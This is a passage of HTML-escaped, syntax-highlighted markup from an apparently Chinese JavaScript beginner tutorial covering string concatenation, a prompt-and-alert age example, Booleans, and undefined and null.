            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 15
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 字符串的拼接 + 只要有字符串和其他类型相拼接，最终的结果是字符串类型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;沙漠&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;骆驼&amp;#39;&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 字符串的沙漠骆驼
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;);	 &lt;span style=&#34;color:#75715e&#34;&gt;// pink老师18
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);	  &lt;span style=&#34;color:#75715e&#34;&gt;// pinktrue
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;);		  &lt;span style=&#34;color:#75715e&#34;&gt;// 24
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;12&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;);		  &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#39;1212&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4234-字符串拼接&#34;&gt;4.2.3.4 字符串拼接&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;多个字符串之间可以使用 + 进行拼接，其拼接方式为 ==字符串 + 任何类型 = 拼接之后的新字符串==&lt;/li&gt;
&lt;li&gt;拼接前会把与字符串相加的任何类型转成字符串，再拼接成一个新的字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 1.1 字符串&amp;#34;相加&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;world&amp;#39;&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// hello world
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 1.2 数值字符串&amp;#34;相加&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;100&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;100&amp;#39;&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 100100
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 1.3 数值字符串 + 数值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;11&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;);			&lt;span style=&#34;color:#75715e&#34;&gt;// 1112
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;+&lt;/code&gt; 号总结口诀：数值相加，字符相连&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;4235-字符串拼接加强&#34;&gt;4.2.3.5 字符串拼接加强&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;);			 &lt;span style=&#34;color:#75715e&#34;&gt;// 只要有字符就会相连
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// console.log(&amp;#39;pink老师age岁啦&amp;#39;);		// 这样不行噢
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;);		 &lt;span style=&#34;color:#75715e&#34;&gt;// pink老师18
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;lgo&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁啦&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// pink老师18岁啦
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;我们经常会将字符串和变量来拼接，因为变量可以很方便地修改里面的值&lt;/li&gt;
&lt;li&gt;变量是不能添加引号的，因为加引号的变量会编程字符串&lt;/li&gt;
&lt;li&gt;如果变量两侧都有字符串拼接，口诀”引引加加“，删掉数字，变量写加中间&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// pink老师18
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;;
            &lt;span style=&#34;color:#75715e&#34;&gt;// console.log(&amp;#39;pink老师age岁&amp;#39;);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 我们变量不要写到字符串里面，是通过和字符串相连的方式实现的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 变量和字符串相连的口诀：引引加加
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁&amp;#39;&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;案例显示年龄&#34;&gt;案例：显示年龄&lt;/h5&gt;
&lt;p&gt;案例分析：利用JS编写的一个非常简单的交互效果程序&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;交互编程的三个基本要素
&lt;ul&gt;
&lt;li&gt;你喜欢我吗？——这是用户输入&lt;/li&gt;
&lt;li&gt;女孩想了想——这是程序内部处理&lt;/li&gt;
&lt;li&gt;最后给了你一巴掌——这是输出结果&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;那么再程序中要如何实现呢？
&lt;ul&gt;
&lt;li&gt;弹出一个输入框（prompt），让用户输入年龄（用户输入）&lt;/li&gt;
&lt;li&gt;把用户输入的值用变量保存起来，把刚才输入的年龄与所要输出的字符串拼接（程序内部处理）&lt;/li&gt;
&lt;li&gt;使用alert语句弹出警示框（输出结果）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 弹出一个输入框（prompt），让用户输入年龄（用户输入）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 把用户输入的值用变量保存起来，把刚才输入的年龄与所要输出的字符串拼接（程序内部处理）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 使用alert语句弹出警示框（输出结果）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入您的年龄&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;您今年已经&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岁了&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;424-布尔型-boolean&#34;&gt;4.2.4 布尔型 Boolean&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;布尔类型有两个值：&lt;code&gt;true&lt;/code&gt;和&lt;code&gt;false&lt;/code&gt;，其中&lt;code&gt;true&lt;/code&gt;表示真（对），而&lt;code&gt;false&lt;/code&gt;表示假（错）&lt;/li&gt;
&lt;li&gt;布尔型和数字型相加的时候，&lt;code&gt;true&lt;/code&gt;的值为1，&lt;code&gt;false&lt;/code&gt;的值为0&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// 1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;425-undefined-和-null&#34;&gt;4.2.5 Undefined 和 Null&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;一个声明后没有被赋值的变量会有一个默认值 undefined（如果进行相连或者相加时，注意结果）&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;variable&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;variable&lt;/span&gt;);		&lt;span style=&#34;color:#75715e&#34;&gt;// undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你好&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;variable&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 你好 undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;variable&lt;/span&gt;);		 &lt;span style=&#34;color:#75715e&#34;&gt;// NaN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;variable&lt;/span&gt;);	 &lt;span style=&#34;color:#75715e&#34;&gt;// NaN
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;一个声明变量给Null值，里面存的值为空（学习对象时，我们继续研究null）&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vari&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你好&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vari&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// 你好null
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vari&lt;/span&gt;);		 &lt;span style=&#34;color:#75715e&#34;&gt;// 11
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vari&lt;/span&gt;);	 &lt;span style=&#34;color:#75715e&#34;&gt;// 1
